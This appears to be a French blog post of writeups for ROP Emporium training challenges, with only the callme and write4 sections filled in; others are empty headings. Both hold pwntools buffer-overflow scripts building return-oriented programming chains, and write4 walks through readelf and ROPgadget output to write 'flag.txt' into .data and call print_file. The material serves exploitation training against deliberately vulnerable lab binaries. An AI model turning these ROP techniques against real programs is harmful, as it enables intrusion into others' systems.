---
title: "ROP Emporium - Writeups"
description: Writeups des challenges x86_64 de ROP Emporium 
---

Aujourd'hui je vous propose mes writeups des challenges x86_64 de [ROP Emporium](https://ropemporium.com/). Vous pouvez retrouver les [scripts de solution](https://github.com/nuts7/nuts7.github.io/tree/master/articles/ropemporium-writeups) directement sur mon GitHub. 😀

# Sommaire
1. [ret2win](#ret2win-writeup)
2. [split](#split-writeup)
3. [callme](#callme-writeup)
4. [write4](#write4-writeup)
5. [badchars](#badchars-writeup)
6. [fluff](#fluff-writeup)
7. [pivot](#pivot-writeup)
8. [ret2csu](#ret2csu-writeup)

<div id='ret2win-writeup'/>
# ret2win

<div id='split-writeup'/>
# split

<div id='callme-writeup'/>
# callme

```py
from pwn import *

context.arch = 'amd64'
p = process("./callme")
elf = ELF("./callme")
rop = ROP("./callme")

padding = cyclic(40)
gadget = p64((rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]))[0])
callme_1 = p64(elf.symbols['callme_one'])
callme_2 = p64(elf.symbols['callme_two'])
callme_3 = p64(elf.symbols['callme_three'])
arg_1 = p64(0xdeadbeefdeadbeef)
arg_2 = p64(0xcafebabecafebabe)
arg_3 = p64(0xd00df00dd00df00d)

def first_call(padding, gadget, callme_1):
    pld_1 = padding
    pld_1 += gadget
    pld_1 += arg_1
    pld_1 += arg_2
    pld_1 += arg_3
    pld_1 += callme_1
    return pld_1

def second_call(padding, gadget, callme_2): 
    pld_2 = gadget
    pld_2 += arg_1
    pld_2 += arg_2
    pld_2 += arg_3
    pld_2 += callme_2
    return pld_2

def third_call(padding, gadget, callme_3):
    pld_3 = gadget
    pld_3 += arg_1
    pld_3 += arg_2
    pld_3 += arg_3
    pld_3 += callme_3
    return pld_3

ropchain = first_call(padding, gadget, callme_1) 
ropchain += second_call(padding, gadget, callme_2)
ropchain += third_call(padding, gadget, callme_3)

p.sendline(ropchain)
p.interactive()
```

<div id='write4-writeup'/>
# write4

Après lecture de la description du [challenge write4](https://ropemporium.com/challenge/write4.html), nous comprenons que nous allons devoir **write flag.txt** en mémoire dans un **segment du binaire accessible en écriture** car cette string n'est pas présente de facon analogue et **call** la fonction `print_file()` dans la **PLT**. Il est spécifié que `print_file()` prend comme seul argument **l'emplacement mémoire** de flag.txt.

Premièrement regardons les permissions des différents segments et sections du binaire :
```py
❯ readelf -S write4
Il y a 29 en-têtes de section, débutant à l'adresse de décalage 0x1980:

En-têtes de section :
<...>
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
<..>
Clé des fanions :
  W (écriture), A (allocation), X (exécution), M (fusion), S (chaînes), I (info),
  L (ordre des liens), O (traitement supplémentaire par l'OS requis), G (groupe),
  T (TLS), C (compressé), x (inconnu), o (spécifique à l'OS), E (exclu),
  l (grand), p (processor specific)
```

Nous remarquons que nous avons 2 segments avec le **flag W** (écriture) d'activé. Par exemple, écrivons la string **flag.txt** dans le segment `.data`. (nous pouvons aussi utiliser .bss)
<br/>

Récupérons l'adresse du segment :

```py
❯ readelf -s write4 | grep .data
     5: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    48: 0000000000601028     0 NOTYPE  WEAK   DEFAULT   23 data_start
    49: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    52: 0000000000601028     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
```

L'adresse de ce dernier est `0x601028`.

Maintenant, nous devons trouver un moyen de setup flag.txt dans .data. Pour cela nous avons 2 gadgets intéressants `pop r14 ; pop 15 ; ret` et `mov qword ptr [r14], r15 ; ret` :

```py
❯ ROPgadget --binary write4
<...>
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
<...>
```

Le but va etre d'empiler **l'adresse du segment writable** (.data) et la string **flag.txt** grace au buffer overflow, de setup ses valeurs dans 2 registres (ici r14 et r15) à l'aide d'un pop, puis de copier la valeur pointé dans l'opérande source (r15 qui pointe vers flag.txt) dans l'opérande de destination. (r14 qui pointe vers l'adresse de .data)
Ainsi, notre string flag.txt sera stocké à l'adresse du segment .data.

Rappel : pop permet de désempiler de la stack la valeur pointé dans RSP et déplacer cette valeur dans l'opérande indiquée.

<br/>

Une fois que nous avons flag.txt dans notre binaire, il nous suffit simplement de passer en argument cette chaine à la fonction `print_file()`. Alors nous avons besoin d'un gadget `pop rdi ; ret` et évidemment de l'adresse de la fonction `print_file()` :

```py
❯ ROPgadget --binary write4 | grep "pop rdi ; ret"
0x0000000000400693 : pop rdi ; ret
❯ objdump -d write4 | grep print_file
0000000000400510 <print_file@plt>:
  400510:       ff 25 0a 0b 20 00       jmpq   *0x200b0a(%rip)        # 601020 <print_file>
  400620:       e8 eb fe ff ff          callq  400510 <print_file@plt>
```

Afin d'automatiser notre exploitation j'ai développé un petit script en python toujours avec la [librairie pwntools](https://github.com/Gallopsled/pwntools) :

```py
from pwn import *

context.arch = 'amd64'
p = process("./write4", stdin=PTY)
elf = ELF("./write4")
rop = ROP("./write4")

padding = cyclic(40)

data_segment = p64(elf.symbols["data_start"]) # readelf -s write4
flag_string = b"flag.txt"

pop_r14_pop_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
mov_ptr_r14_r15 = p64(0x400628)

pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0])
print_file = p64(elf.symbols['print_file'])

pld = padding
pld += pop_r14_pop_r15 # to setup data addr & flag.txt in registers
pld += data_segment
pld += flag_string
pld += mov_ptr_r14_r15 # mov qword ptr [r14], r15 ; ret ==> to move flag.txt in data segment
pld += pop_rdi # to put the memory location of flag.txt in print_file() as argument
pld += data_segment
pld += print_file

p.sendline(pld)
p.interactive()
```

<div id='badchars-writeup'/>
# badchars

<div id='fluff-writeup'/>
# fluff

<div id='pivot-writeup'/>
# pivot

<div id='ret2csu-writeup'/>
# ret2csu
